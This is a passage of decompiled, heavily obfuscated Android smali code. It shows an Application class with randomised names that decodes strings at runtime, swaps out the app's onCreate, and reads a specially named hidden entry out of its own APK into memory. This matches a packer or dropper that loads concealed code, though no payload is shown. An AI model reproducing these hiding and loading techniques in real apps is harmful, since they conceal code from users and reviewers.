    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "fmgCDornvtueYxPt"

    .line 335
    invoke-static {v4}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 334
    invoke-static {v3, v4, v2, v1}, Lcom/XYLbKnJHsb;->AnUNtXHCQEdoeNFwH(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    .line 337
    :try_start_3
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 341
    :cond_1
    invoke-virtual {v1}, Landroid/app/Application;->onCreate()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 343
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v4, "QNcpnazVcfknWEdKxGoY456"

    invoke-static {v4}, Lcom/XYLbKnJHsb;->AGyNn123(Ljava/lang/String;)V

    invoke-static {v4}, Lcom/XYLbKnJHsb;->GKOxLlIpop123(Ljava/lang/String;)V

    .line 350
    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    :goto_1
    return-void
.end method

.method public rnCkCHWZROCuuZfQixuUvJQao()[B
    .locals 5
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 102
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 103
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {p0}, Lcom/XYLbKnJHsb;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    iget-object v2, v2, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 104
    new-instance v1, Ljava/util/zip/ZipInputStream;

    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-virtual {p0}, Lcom/XYLbKnJHsb;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v4

    iget-object v4, v4, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-direct {v3, v4}, Ljava/io/FileInputStream;-><init>(Ljava/lang/String;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v2}, Ljava/util/zip/ZipInputStream;-><init>(Ljava/io/InputStream;)V

    .line 106
    :cond_0
    :goto_0
    invoke-virtual {v1}, Ljava/util/zip/ZipInputStream;->getNextEntry()Ljava/util/zip/ZipEntry;

    move-result-object v2

    if-nez v2, :cond_1

    .line 108
    invoke-virtual {v1}, Ljava/util/zip/ZipInputStream;->close()V

    .line 120
    invoke-virtual {v1}, Ljava/util/zip/ZipInputStream;->close()V

    .line 121
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    return-object v0

    .line 111
    :cond_1
    invoke-virtual {v2}, Ljava/util/zip/ZipEntry;->getName()Ljava/lang/String;

    move-result-object v2

    const-string v3, "EctlBapsEsteJsF.rdVerx"

    invoke-static {v3}, Lcom/XYLbKnJHsb;->hmwwvCWYYmCpKI(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    const/16 v2, 0x400

    new-array v2, v2, [B

    .line 114
    :goto_1
    invoke-virtual {v1, v2}, Ljava/util/zip/ZipInputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-ne v3, v4, :cond_2

    goto :goto_0

    :cond_2
    const/4 v4, 0x0

    .line 116
    invoke-virtual {v0, v2, v4, v3}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :goto_1
.end method
